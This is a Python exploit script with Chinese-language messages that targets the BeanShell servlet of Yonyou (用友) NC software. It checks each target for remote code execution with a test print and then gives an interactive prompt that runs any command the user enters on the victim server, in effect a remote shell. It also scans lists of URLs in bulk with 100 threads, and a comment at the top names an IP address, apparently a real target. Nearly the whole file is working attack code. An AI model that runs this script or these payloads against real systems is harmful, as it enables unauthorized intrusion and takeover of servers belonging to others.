#http://119.8.163.86:3399
import argparse
import re
import requests
import sys
import os
import time

from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(targer):
    url = targer+"/servlet/~ic/bsh.servlet.BshServlet"
    headers = {
        "User - Agent": "Mozilla / 5.0(Windows NT 10.0; Win64; x64; rv: 120.0) Gecko / 20100101  Firefox / 120.0",
        "Content - Type": "application / x - www - form - urlencoded",
        "Cookie": "JSESSIONID = 8E5DF12048ACEAF76330EB94C8940019.server",
        "Content - Length": "39"
    }
    data = {
        "bsh.script":"print(\"hello\");"
    }
    res = requests.post(url = url,headers = headers,data=data,verify = False,timeout=5).text
    if "hello" in res:
        print("存在存在存在漏洞！！！！！"+targer)
        return True
    else:
        print("不存在漏洞")
        return False





def exp(target):
    print("正在努力给你搞一个shell...")
    time.sleep(2)
    os.system("cls")

    headers = {
        "User - Agent": "Mozilla / 5.0(Windows NT 10.0; Win64; x64; rv: 120.0) Gecko / 20100101  Firefox / 120.0",
        "Content - Type": "application / x - www - form - urlencoded",
        "Cookie": "JSESSIONID = 8E5DF12048ACEAF76330EB94C8940019.server",
        "Content - Length": "39"
    }

    while True:
        cmd = input("请输入您要执行的命令(按q退出)：")
        data = {
            "bsh.script":f'exec("{cmd}");'
        }
        if cmd == 'q':
            exit()
        res = requests.post(url=target+"/servlet/~ic/bsh.servlet.BshServlet",headers=headers,data=data,verify=False,timeout=5).text
        result = re.findall('''<pre>(.*?)</pre>''',res,re.S)[0]
        print(result)


def banna():
    banna = """
             ▄▄▄▄    ▄▄▄       ███▄    █  ▄▄▄       ███▄    █  ▄▄▄     ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
    ▓█████▄ ▒████▄     ██ ▀█   █ ▒████▄     ██ ▀█   █ ▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
    ▒██▒ ▄██▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
    ▒██░█▀  ░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
    ░▓█  ▀█▓ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
    ░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
    ▒░▒   ░   ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
     ░    ░   ░   ▒      ░   ░ ░   ░   ▒      ░   ░ ░   ░   ▒    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
     ░            ░  ░         ░       ░  ░         ░       ░  ░            ░ ░      ░ ░      ░  ░
          ░                                                                                       

    """
    print(banna)


def main():
    banna()

    parser = argparse.ArgumentParser(description="用友远程命令执行")
    parser.add_argument("-u","--url",help="YOUR URL")
    parser.add_argument("-f","--file",help="YOUR FILE")

    args = parser.parse_args()

    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)

    elif not args.url and args.file:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as  fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))

        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()